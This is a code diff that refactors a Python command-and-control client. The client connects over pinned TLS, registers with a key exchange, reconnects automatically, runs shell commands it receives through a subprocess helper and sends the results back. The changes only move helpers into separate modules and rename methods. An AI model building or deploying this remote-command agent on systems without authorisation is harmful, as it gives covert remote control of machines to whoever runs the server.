@@ -2,7 +2,6 @@ import asyncio
 import logging
 import time
 import uuid
-import base64
 import argparse
 from typing import Optional
 from models.message import Message
@@ -13,6 +12,8 @@ from models.key_manager import KeyManager
 from models.encryption_manager import EncryptionManager
 from models.tls_helper import TLSSessionHelper
 import helper.subprocess as subprocess_helper
+import helper.auth as auth_helper
+import helper.helper_funcs as helper_funcs
 
 # ==================== CONFIGURATION ====================
 
@@ -24,31 +25,6 @@ logger = logging.getLogger(__name__)
 
 # ==================== CORE C2 CLIENT LOGIC ====================
 
-from cryptography import x509
-from cryptography.hazmat.primitives import hashes, serialization
-import base64
-
-
-def get_spki_hash(der_cert_bytes: bytes) -> str:
-    cert = x509.load_der_x509_certificate(der_cert_bytes)
-    public_key = cert.public_key()
-    spki_bytes = public_key.public_bytes(
-        encoding=serialization.Encoding.DER,
-        format=serialization.PublicFormat.SubjectPublicKeyInfo
-    )
-    digest = hashes.Hash(hashes.SHA256())
-    digest.update(spki_bytes)
-    return base64.b64encode(digest.finalize()).decode("ascii")
-
-def validate_server_certificate(writer: asyncio.StreamWriter) -> bool:
-    server_sha = "jPxWXE+5YqcWif1pSG7ixZAVbFY3bI1JhbbtaOcPxFM="
-    ssl_obj = writer.get_extra_info("ssl_object")
-    der_cert = ssl_obj.getpeercert(binary_form=True)
-    server_sha_received = get_spki_hash(der_cert)
-    if server_sha_received == server_sha:
-        return True
-    logger.error("Server certificate is not valid")
-    return False
 
 class C2Client:
     """Main C2 Client"""
@@ -67,7 +43,7 @@ class C2Client:
         self._executor_task = None
         self.execution_process = None
     
-    async def connect(self) -> bool:
+    async def _connect(self) -> bool:
         """
         Connect to C2 server and register
         """
@@ -83,14 +59,20 @@ class C2Client:
                 ssl=ssl_ctx,
             )
             logger.info(f"Connected to server at {self.server_host}:{self.server_port}")
-            if not validate_server_certificate(self.writer):
-                await self._reset_writer_reader()
+            if not auth_helper.validate_server_certificate(self.writer):
+                logger.error("Server certificate is not valid")
+                await self._reset_connection()
                 return False
             # Send registration message with client's public key
             if not await self._send_register_message():
                 return False
             # Receive acknowledgment with server's public key
-            return await self._receive_ack_message()
+            ack_msg = await self._receive_ack_message()
+            if not ack_msg:
+                return False
+            self._set_encryption(server_public_key=ack_msg.command)
+            logger.info(f"Registered as {ack_msg.client_id}")
+            return True
         
         except ConnectionRefusedError:
             logger.error("Connection refused, server possibly down")
@@ -99,22 +81,36 @@ class C2Client:
         except Exception as e:
             logger.error(f"Connection failed: {e}")
 
-    async def _receive_ack_message(self) -> bool:
-        encrypted_message = await receive_message(self.reader)
-        if not encrypted_message:
+    async def _send_register_message(self) -> bool:
+        """
+        Send registration message to server
+        """
+        msg = Message.as_register(self.client_id, self.key_manager.serialized_public_key)
+        return await send_message(
+            self.writer,
+            msg.to_payload(True)
+        )
+
+    async def _receive_ack_message(self) -> Message:
+        msg = await receive_message(self.reader)
+        if not msg:
             logger.error("No acknowledgment received")
-            return False
-        msg = Message.from_payload(encrypted_message)
-        if msg and msg.type is MessageType.ACK:
-            # Setup encryption with server's public key
-            session_key = self.key_manager.compute_session_key(msg.command)
-            self._encryption_manager = EncryptionManager(session_key)
-            logger.info(f"Registered as {msg.client_id}")
-            return True
-        logger.error("Registration failed")
-        return False
+            return None
+        msg = Message.from_payload(msg)
+        if not msg:
+            logger.error("Failed to parse acknowledgment message")
+            return None
+        if msg.type is not MessageType.ACK:
+            logger.error(f"Unexpected message type: {msg.type}")
+            return None
+        return msg
     
-    async def reconnect_loop(self):
+    def _set_encryption(self, server_public_key: str) -> None:
+        """Setup encryption with server's public key"""
+        session_key = self.key_manager.compute_session_key(server_public_key)
+        self._encryption_manager = EncryptionManager(session_key)
+    
+    async def _reconnection_loop(self):
         """
         Auto-reconnect logic
         Attempts to reconnect every 1 second if disconnected
@@ -127,7 +123,7 @@ class C2Client:
                     logger.info('reader/writer exists - no reconnection needed')
                     return
                 
-                if await self.connect():
+                if await self._connect():
                     logger.info(f"Connected successfully {self.client_id}")
                     return
                 
@@ -136,40 +132,12 @@ class C2Client:
             
         except asyncio.CancelledError:
             logger.info("Reconnect loop cancelled")
-            await self._reset_writer_reader()
+            await self._reset_connection()
         except Exception as e:
             logger.error(f"Reconnect loop error: {e}")
-            await self._reset_writer_reader()
+            await self._reset_connection()
     
-    async def main_loop(self):
-        """
-        Main client loop
-        """
-        listener = asyncio.create_task(self._listener(), name='listener')
-        talker = asyncio.create_task(self._talker(), name='talker')
-
-        try:
-            await listener # Wait for listener to detect disconnect
-        except asyncio.CancelledError:
-            logger.info("Client main loop cancelled")
-            self.running = False
-        except asyncio.IncompleteReadError:
-            logger.info("main loop error - Server closed connection")
-        except Exception as e:
-            logger.error(f"Client main loop error: {e}")
-        finally:
-            # Connection is dead - clean up
-            await self._cancel_task(talker, related_queue=self.talking_queue)
-            await self._reset_writer_reader()
-            if self.running:
-                logger.info("Client main loop finished - client still running")
-                return
-            await self._cancel_task(self._executor_task)
-            logger.info("Terminating execution process")
-            await self._terminate_execution_process()
-            logger.info('Main loop done')
-
-    async def _reset_writer_reader(self):
+    async def _reset_connection(self):
         try:
             logger.info('in reset_writer_reader')
             if self.writer and not self.writer.is_closing():
@@ -181,21 +149,33 @@ class C2Client:
             self.reader = None
             self.writer = None
 
-    @staticmethod
-    async def _cancel_task(task: asyncio.Task, related_queue: Optional[asyncio.Queue] = None):
+    async def _lifecycle(self):
+        """
+        Main client loop
+        """
+        listener = asyncio.create_task(self._listener(), name='listener')
+        talker = asyncio.create_task(self._talker(), name='talker')
+
         try:
-            if related_queue and not related_queue.empty():
-                await asyncio.wait_for(task, timeout=2.0)  # TODO: set time var
-            if not task.done():
-                task.cancel()
-                logger.info(f"Task {task.get_name()} cancelled")
+            await listener # Wait for listener to detect disconnect
         except asyncio.CancelledError:
-            logger.info(f"Task {task.get_name()} already cancelled")
-        except asyncio.TimeoutError:
-            logger.info(f"Task {task.get_name()} timeout during cancellation")  
+            logger.info("Lifecycle detected cancellation")
+            self.running = False
+        except asyncio.IncompleteReadError:
+            logger.info("Lifecycle detected server closed connection")
         except Exception as e:
-            logger.error(f"Error cancelling tasks: {e}")
-    
+            logger.error(f"Lifecycle detected an error: {e}")
+        finally:
+            # Connection is dead - clean up
+            await helper_funcs.cancel_task(talker, related_queue=self.talking_queue)
+            await self._reset_connection()
+            if self.running:
+                return
+            await helper_funcs.cancel_task(self._executor_task)
+            logger.info("Terminating execution process")
+            await self._terminate_execution_process()
+            logger.info('Lifecycle finished')
+
     async def _listener(self):
         """
         Listen for incoming commands from server
@@ -230,74 +210,12 @@ class C2Client:
             if self.running:
                 logger.info("Server closed connection")
                 raise
-            else:
-                logger.info("Client closed connection")
         except Exception as e:
             logger.error(f"Command listener error: {e}")
+            raise
         finally:
             logger.info("Listener finished")
 
-    async def _handle_received_kill_command(self) -> None:
-        await self._terminate_execution_process()
-        logger.info('Draining command queue')
-        self._drain_queue(self.command_queue)
-        logger.info('Draining talking queue')
-        self._drain_queue(self.talking_queue)
-        self.running = False
-
-    async def _enqueue_command(self, message: Message) -> None:
-        await self.command_queue.put({
-            "cmd_id": message.cmd_id,
-            "command": message.command
-        })
-
-    async def _enqueue_result(self, result_data: tuple[str, str, str]) -> None:
-        command_id, result, exec_time_ms = result_data
-        await self.talking_queue.put({
-            "cmd_id": command_id,
-            "result": result,
-            "exec_time_ms": exec_time_ms
-        })
-
-    @staticmethod
-    def _drain_queue(queue: asyncio.Queue):
-        # TODO: make global helper function
-        try:
-            while not queue.empty():
-                cmd_data = queue.get_nowait()
-                queue.task_done()
-                logger.info(f"Drained command id: {cmd_data.get('cmd_id', '?')}")
-            logger.info("Drained queue")
-        except asyncio.QueueEmpty:
-            logger.info("Queue is empty")
-        except Exception as e:
-            logger.error(f"Error draining queue: {e}")
-
-    async def _dequeue_command(self) -> tuple[str, str]:
-        """
-        Fetch command from queue
-        """
-        command_data: dict = await self.command_queue.get()
-        if command_data is None:
-            logger.info("Received None from queue")
-            return None
-        command_id: str = command_data.get("cmd_id")
-        command: str = command_data.get("command", "").lower()
-        logger.info(f"Processing command: {command}")
-        return command_id, command
-    
-    async def _dequeue_result(self) -> tuple[str, str, str]:
-        """
-        Fetch result from queue
-        """
-        result_data: dict = await self.talking_queue.get()
-        if result_data is None:
-            return None, None, None
-        command_id: str = result_data.get("cmd_id", "?")
-        result: str = result_data.get("result", "?")
-        exec_time_ms: str = result_data.get("exec_time_ms", "?")
-        return command_id, result, exec_time_ms
-    
     async def _executor(self):
         """
         Execute commands from queue
@@ -321,17 +239,23 @@ class C2Client:
         finally:
             logger.info("Executor finished")
 
-    async def _process_command(self, command_data: tuple[str, str]) -> tuple[str, float]:
-        cmd_id, command = command_data
-        start_time = time.monotonic()
-        if command == CommandType.KILL.value:  # TODO
-            result = "Client killed by server"
-        else:
-            result = await self._execute_command(cmd_id, command)  # Run asynchronously with subprocess
-        exec_time_ms = (time.monotonic() - start_time) * 1000
-        logger.info(f"Executed: {command} ({exec_time_ms:.1f}ms)")
-        return cmd_id, result, exec_time_ms
-    
+    async def _talker(self):
+        try:
+            while self.running:
+                result_data = await self._dequeue_result()
+                await self._send_result(result_data) # Send result back to server
+            else:
+                logger.info("talker exiting | client not running")
+        except asyncio.CancelledError:
+            logger.info("talker cancelled")
+            raise
+        except Exception as e:
+            await self.talking_queue.put(result_data)  # Re-queue unsent data
+            logger.error(f"Talker error: {e}")
+            raise
+        finally:
+            logger.info("Talker finished")
+
     async def _send_result(self, result_data: tuple[str, str, str]) -> bool:
         command_id, result, execution_time_ms = result_data
         msg = Message.as_result(command_id, result, execution_time_ms)
@@ -345,15 +269,63 @@ class C2Client:
         logger.info(f"[cmd id: {command_id}] Failed to send result")
         return False
 
-    async def _send_register_message(self) -> bool:
+    async def _handle_received_kill_command(self) -> None:
+        await self._terminate_execution_process()
+        logger.info('Draining command queue')
+        helper_funcs.drain_queue(self.command_queue)
+        logger.info('Draining talking queue')
+        helper_funcs.drain_queue(self.talking_queue)
+        self.running = False
+
+    async def _enqueue_command(self, message: Message) -> None:
+        await self.command_queue.put({
+            "cmd_id": message.cmd_id,
+            "command": message.command
+        })
+
+    async def _dequeue_command(self) -> tuple[str, str]:
         """
-        Send registration message to server
+        Fetch command from queue
         """
-        msg = Message.as_register(self.client_id, self.key_manager.serialized_public_key)
-        return await send_message(
-            self.writer,
-            msg.to_payload(True)
-        )
+        command_data: dict = await self.command_queue.get()
+        if command_data is None:
+            logger.info("Received None from queue")
+            return None
+        command_id: str = command_data.get("cmd_id")
+        command: str = command_data.get("command", "").lower()
+        logger.info(f"Processing command: {command}")
+        return command_id, command
+
+    async def _enqueue_result(self, result_data: tuple[str, str, str]) -> None:
+        command_id, result, exec_time_ms = result_data
+        await self.talking_queue.put({
+            "cmd_id": command_id,
+            "result": result,
+            "exec_time_ms": exec_time_ms
+        })
+
+    async def _dequeue_result(self) -> tuple[str, str, str]:
+        """
+        Fetch result from queue
+        """
+        result_data: dict = await self.talking_queue.get()
+        if result_data is None:
+            return None, None, None
+        command_id: str = result_data.get("cmd_id", "?")
+        result: str = result_data.get("result", "?")
+        exec_time_ms: str = result_data.get("exec_time_ms", "?")
+        return command_id, result, exec_time_ms
+
+    async def _process_command(self, command_data: tuple[str, str]) -> tuple[str, float]:
+        cmd_id, command = command_data
+        start_time = time.monotonic()
+        if command == CommandType.KILL.value:  # TODO
+            result = "Client killed by server"
+        else:
+            result = await self._execute_command(cmd_id, command)  # Run asynchronously with subprocess
+        exec_time_ms = (time.monotonic() - start_time) * 1000
+        logger.info(f"Executed: {command} ({exec_time_ms:.1f}ms)")
+        return cmd_id, result, exec_time_ms
 
     async def _execute_command(self, cmd_id: str, command: str) -> str:
         """
@@ -371,23 +343,6 @@ class C2Client:
         except Exception as e:
             logger.info(f"Command execution error: {str(e)}")
             raise
-
-    async def _talker(self):
-        try:
-            while self.running:
-                result_data = await self._dequeue_result()
-                await self._send_result(result_data) # Send result back to server
-            else:
-                logger.info("talker exiting | client not running")
-        except asyncio.CancelledError:
-            logger.info("talker cancelled")
-            raise
-        except Exception as e:
-            await self.talking_queue.put(result_data)  # Re-queue unsent data
-            logger.error(f"Talker error: {e}")
-            raise
-        finally:
-            logger.info("Talker finished")
 
     async def _terminate_execution_process(self):
         """Terminate execution process if it exists"""
@@ -420,9 +375,9 @@ class C2Client:
         try:
             self._executor_task = asyncio.create_task(self._executor(), name='executor')
             while self.running:
-                await self.reconnect_loop()
+                await self._reconnection_loop()
                 if self.reader and self.writer:
-                    await self.main_loop()
+                    await self._lifecycle()
         except asyncio.CancelledError:
             logger.info("Client start cancelled")
         except Exception as e:
